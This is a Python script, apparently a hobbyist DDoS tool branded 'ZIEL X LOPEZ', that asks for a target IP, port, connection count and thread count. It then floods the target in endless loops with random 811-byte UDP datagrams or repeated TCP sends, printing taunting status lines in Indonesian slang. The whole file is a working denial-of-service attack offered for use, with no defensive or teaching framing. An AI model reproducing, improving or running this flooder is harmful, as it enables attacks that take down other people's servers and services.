#!/usr/bin/env python3
import random
import socket
import threading
import os

os.system("clear")

print('''\033[1;31;40m
███████╗██╗███████╗██╗         ██╗  ██╗    ██╗      ██████╗ ██████╗ ███████╗███████╗
╚══███╔╝██║██╔════╝██║         ╚██╗██╔╝    ██║     ██╔═══██╗██╔══██╗██╔════╝╚══███╔╝
  ███╔╝ ██║█████╗  ██║          ╚███╔╝     ██║     ██║   ██║██████╔╝█████╗    ███╔╝ 
 ███╔╝  ██║██╔══╝  ██║          ██╔██╗     ██║     ██║   ██║██╔═══╝ ██╔══╝   ███╔╝  
███████╗██║███████╗███████╗    ██╔╝ ██╗    ███████╗╚██████╔╝██║     ███████╗███████╗
╚══════╝╚═╝╚══════╝╚══════╝    ╚═╝  ╚═╝    ╚══════╝ ╚═════╝ ╚═╝     ╚══════╝╚══════╝
''')
print("\033[94m")
ip = str(input(" Ip Target: "))
port = int(input(" Port Target : "))
choice = str(input(" Attack DDoS ? (y/n) : "))
times = int(input(" Connections : "))
threads = int(input(" Threads : "))
def run():
	data = random._urandom(811)
	i = random.choice(("[^]","[*]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" ZIELXXX NIH MANISZZZ!!!")
		except:
			print("[X] MT KAH MANISSS???")

def run2():
	data = random._urandom(811)
	i = random.choice(("[!]","[^]","[*]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" ZIELXXX NIH MANISZZZ!!!")
		except:
			s.close()
			print("[X] MT KAH MANISSS???")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
